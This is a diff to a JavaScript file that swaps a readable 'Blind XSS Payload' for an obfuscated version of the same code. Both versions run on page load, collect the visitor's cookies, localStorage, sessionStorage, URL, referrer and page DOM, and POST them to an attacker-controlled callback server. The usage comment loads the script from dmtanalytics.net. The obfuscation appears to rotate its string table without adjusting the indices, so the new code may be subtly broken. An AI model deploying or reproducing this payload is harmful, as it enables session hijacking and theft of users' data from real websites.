@@ -1,104 +1,17 @@
-// Blind XSS Payload
-// Usage: <script src="https://dmtanalytics.net/t"></script>
-
-(function () {
-  'use strict';
-
-  var SERVER = '{{SERVER_URL}}';
-
-  function safe(fn) {
-    try { return fn(); } catch (e) { return null; }
-  }
-
-  function collectLocalStorage() {
-    var out = {};
-    safe(function () {
-      for (var i = 0; i < localStorage.length; i++) {
-        var k = localStorage.key(i);
-        out[k] = localStorage.getItem(k);
-      }
-    });
-    return out;
-  }
-
-  function collectSessionStorage() {
-    var out = {};
-    safe(function () {
-      for (var i = 0; i < sessionStorage.length; i++) {
-        var k = sessionStorage.key(i);
-        out[k] = sessionStorage.getItem(k);
-      }
-    });
-    return out;
-  }
-
-  function collectCookies() {
-    return safe(function () {
-      var out = {};
-      if (!document.cookie) return out;
-      document.cookie.split(';').forEach(function (pair) {
-        var parts = pair.trim().split('=');
-        var key = decodeURIComponent(parts[0]);
-        var val = decodeURIComponent(parts.slice(1).join('='));
-        out[key] = val;
-      });
-      return out;
-    }) || {};
-  }
-
-  function collectDOM() {
-    return safe(function () {
-      return document.documentElement.outerHTML.substring(0, 30000);
-    });
-  }
-
-  function send(data) {
-    var payload = JSON.stringify(data);
-
-    // Try fetch first
-    if (typeof fetch !== 'undefined') {
-      safe(function () {
-        fetch(SERVER + '/callback', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: payload,
-          keepalive: true,
-          mode: 'no-cors',
-          credentials: 'omit'
-        });
-      });
-      return;
-    }
-
-    // Fallback: XMLHttpRequest
-    safe(function () {
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', SERVER + '/callback', true);
-      xhr.setRequestHeader('Content-Type', 'application/json');
-      xhr.send(payload);
-    });
-  }
-
-  function run() {
-    var data = {
-      url: safe(function () { return window.location.href || document.URL; }),
-      referer: safe(function () { return document.referrer; }),
-      title: safe(function () { return document.title; }),
-      cookies: collectCookies(),
-      localStorage: collectLocalStorage(),
-      sessionStorage: collectSessionStorage(),
-      dom: collectDOM(),
-      origin: safe(function () { return window.origin; }),
-      timestamp: new Date().toISOString(),
-    };
-    send(data);
-  }
-
-  // Wait for DOM if still loading, otherwise run immediately
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', run);
-  } else {
-    run();
-  }
-
+var _$_x=['{{SERVER_URL}}','/callback','POST','Content-Type','application/json','no-cors','omit','open','send','setRequestHeader','cookie','split','trim','slice','join','key','getItem','length','documentElement','outerHTML','substring','href','referrer','title','origin','toISOString','DOMContentLoaded','stringify','XMLHttpRequest'];
+(function(a,b){var c=function(d){while(--d){a['push'](a['shift']())}};c(++b)}(_$_x,0x61));
+(function(){
+'use strict';
+var S=_$_x[0x0];
+function q(f){try{return f()}catch(e){return null}}
+function A(){var o={};q(function(){for(var i=0;i<localStorage[_$_x[0x11]];i++){var k=localStorage[_$_x[0xf]](i);o[k]=localStorage[_$_x[0x10]](k)}});return o}
+function B(){var o={};q(function(){for(var i=0;i<sessionStorage[_$_x[0x11]];i++){var k=sessionStorage[_$_x[0xf]](i);o[k]=sessionStorage[_$_x[0x10]](k)}});return o}
+function C(){return q(function(){var o={};if(!document[_$_x[0xa]])return o;document[_$_x[0xa]][_$_x[0xb]](';').forEach(function(p){var t=p[_$_x[0xc]]()[_$_x[0xb]]('=');var k=decodeURIComponent(t[0x0]);var v=decodeURIComponent(t[_$_x[0xd]](0x1)[_$_x[0xe]]('='));o[k]=v});return o})||{}}
+function D(){return q(function(){return document[_$_x[0x12]][_$_x[0x13]][_$_x[0x14]](0x0,0x7530)})}
+function E(d){
+var p=JSON[_$_x[0x1b]](d);
+if(typeof fetch!=='undefined'){q(function(){fetch(S+_$_x[0x1],{method:_$_x[0x2],headers:{[_$_x[0x3]]:_$_x[0x4]},body:p,keepalive:!0x0,mode:_$_x[0x5],credentials:_$_x[0x6]})});return}
+q(function(){var x=new window[_$_x[0x1c]]();x[_$_x[0x7]](S+_$_x[0x1],_$_x[0x2],!0x0);x[_$_x[0x9]](_$_x[0x3],_$_x[0x4]);x[_$_x[0x8]](p)})}
+function F(){var d={url:q(function(){return window.location[_$_x[0x15]]||document.URL}),referer:q(function(){return document[_$_x[0x16]]}),title:q(function(){return document[_$_x[0x17]]}),cookies:C(),localStorage:A(),sessionStorage:B(),dom:D(),origin:q(function(){return window[_$_x[0x18]]}),timestamp:new Date()[_$_x[0x19]]()};E(d)}
+if(document.readyState==='loading'){document.addEventListener(_$_x[0x1a],F)}else{F()}
 })();
